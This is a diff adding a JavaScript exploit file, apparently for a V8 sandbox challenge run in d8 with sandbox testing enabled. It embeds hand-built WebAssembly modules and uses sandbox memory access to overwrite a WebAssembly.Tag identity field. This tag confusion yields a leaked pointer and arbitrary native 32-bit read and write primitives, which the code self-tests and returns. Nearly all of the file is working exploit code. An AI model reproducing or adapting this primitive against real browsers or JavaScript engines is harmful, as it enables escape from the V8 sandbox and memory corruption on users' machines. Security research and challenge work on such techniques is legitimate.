@@ -1,0 +1,107 @@
+const realSandbox = globalThis.Sandbox;
+if (realSandbox === undefined) {
+    throw new Error("This challenge requires d8 with --sandbox-testing enabled.");
+}
+
+const tagFactoryBytes = new Uint8Array([
+    0, 97, 115, 109, 1, 0, 0, 0, 1, 17, 3, 95, 1, 127, 1, 96,
+    2, 100, 0, 126, 0, 96, 2, 126, 100, 0, 0, 13, 5, 2, 0,
+    1, 0, 2, 7, 15, 2, 4, 116, 97, 103, 65, 4, 0, 4,
+    116, 97, 103, 66, 4, 1,
+]);
+const importedTagNativeProbeBytes = new Uint8Array([
+    0, 97, 115, 109, 1, 0, 0, 0, 1, 51, 11, 95, 1, 127,
+    1, 96, 2, 100, 0, 126, 0, 96, 2, 126, 100, 0, 0, 96,
+    0, 0, 93, 3, 96, 0, 0, 96, 0, 3, 126, 100, 0, 100,
+    4, 96, 1, 127, 0, 96, 0, 1, 126, 96, 1, 126, 1, 127,
+    96, 2, 126, 127, 0, 2, 21, 2, 1, 109, 4, 116, 97, 103,
+    65, 4, 0, 1, 1, 109, 4, 116, 97, 103, 66, 4, 0, 2,
+    3, 6, 5, 5, 7, 8, 9, 10, 6, 17, 3, 99, 0, 1, 208,
+    0, 11, 126, 1, 66, 0, 11, 126, 1, 66, 0, 11, 7, 83,
+    7, 4, 103, 66, 111, 120, 3, 0, 5, 103, 76, 101, 97, 107,
+    3, 1, 5, 103, 65, 100, 100, 114, 3, 2, 8, 105, 110, 105,
+    116, 95, 98, 111, 120, 0, 1, 12, 108, 101, 97, 107, 95, 98,
+    111, 120, 95, 112, 116, 114, 0, 2, 13, 110, 97, 116, 105, 118,
+    101, 95, 114, 101, 97, 100, 51, 50, 0, 3, 14, 110, 97, 116,
+    105, 118, 101, 95, 119, 114, 105, 116, 101, 51, 50, 0, 4, 9,
+    5, 1, 3, 0, 1, 0, 10, 132, 1, 5, 9, 0, 35, 0, 212,
+    35, 2, 226, 0, 11, 9, 0, 32, 0, 251, 0, 0, 36, 0,
+    11, 34, 0, 66, 136, 239, 153, 171, 197, 232, 140, 145, 17, 36,
+    2, 2, 6, 210, 0, 224, 4, 227, 4, 1, 0, 1, 0, 0,
+    11, 26, 26, 36, 1, 35, 1, 11, 36, 1, 1, 100, 0, 32,
+    0, 66, 7, 125, 36, 2, 2, 6, 210, 0, 224, 4, 227, 4,
+    1, 0, 1, 0, 0, 11, 26, 33, 1, 26, 32, 1, 251, 2,
+    0, 0, 11, 38, 1, 1, 100, 0, 32, 0, 66, 7, 125, 36,
+    2, 2, 6, 210, 0, 224, 4, 227, 4, 1, 0, 1, 0, 0,
+    11, 26, 33, 2, 26, 32, 2, 32, 1, 251, 5, 0, 0, 11,
+    0, 74, 4, 110, 97, 109, 101, 1, 67, 5, 0, 9, 115, 117,
+    115, 112, 101, 110, 100, 101, 114, 1, 8, 105, 110, 105, 116, 95,
+    98, 111, 120, 2, 12, 108, 101, 97, 107, 95, 98, 111, 120, 95,
+    112, 116, 114, 3, 13, 110, 97, 116, 105, 118, 101, 95, 114, 101,
+    97, 100, 51, 50, 4, 14, 110, 97, 116, 105, 118, 101, 95, 119,
+    114, 105, 116, 101, 51, 50,
+]);
+
+function createWasmFXImportedTagNativePrimitive() {
+    function read32Caged(offset) {
+        return new DataView(new realSandbox.MemoryView(Number(offset), 4)).getUint32(0, true);
+    }
+
+    function write32Caged(offset, value) {
+        new DataView(new realSandbox.MemoryView(Number(offset), 4)).setUint32(0, Number(value) >>> 0, true);
+    }
+
+    function isTaggedReference(value) {
+        return (value & 1) === 1;
+    }
+
+    const tagFactory = new WebAssembly.Instance(new WebAssembly.Module(tagFactoryBytes), {}).exports;
+    const tagA = tagFactory.tagA;
+    const tagB = tagFactory.tagB;
+    const tagAOffset = realSandbox.getAddressOf(tagA);
+    const tagBOffset = realSandbox.getAddressOf(tagB);
+    const maxOffset = Math.min(realSandbox.getSizeOf(tagA), realSandbox.getSizeOf(tagB), 0x80);
+
+    let identityField;
+    for (let offset = 8; offset < maxOffset; offset += 4) {
+        const tagAIdentity = read32Caged(tagAOffset + offset) >>> 0;
+        const tagBIdentity = read32Caged(tagBOffset + offset) >>> 0;
+        if (!isTaggedReference(tagAIdentity) || !isTaggedReference(tagBIdentity) || tagAIdentity === tagBIdentity) continue;
+
+        const tagAIndex = read32Caged((tagAIdentity - 1) + 4) >>> 1;
+        const tagBIndex = read32Caged((tagBIdentity - 1) + 4) >>> 1;
+        if (tagAIndex === 0 && tagBIndex === 1) {
+            identityField = { offset, tagAIdentity };
+            break;
+        }
+    }
+    if (identityField === undefined) {
+        throw new Error("failed to locate the WebAssembly.Tag identity field");
+    }
+
+    write32Caged(tagBOffset + identityField.offset, identityField.tagAIdentity);
+    const exports = new WebAssembly.Instance(
+        new WebAssembly.Module(importedTagNativeProbeBytes),
+        { m: { tagA, tagB } },
+    ).exports;
+
+    exports.init_box(0x41424344);
+    const leakedPointer = BigInt(exports.leak_box_ptr());
+    const boxField = leakedPointer + 7n;
+    const before = exports.native_read32(boxField) >>> 0;
+    exports.native_write32(boxField, 0x55667788);
+    const after = exports.native_read32(boxField) >>> 0;
+    if (before !== 0x41424344 || after !== 0x55667788) {
+        throw new Error("WasmFX imported-tag native primitive self-test failed");
+    }
+
+    return Object.freeze({
+        leakedPointer,
+        read32(address) {
+            return exports.native_read32(BigInt(address)) >>> 0;
+        },
+        write32(address, value) {
+            exports.native_write32(BigInt(address), value >>> 0);
+        },
+    });
+}
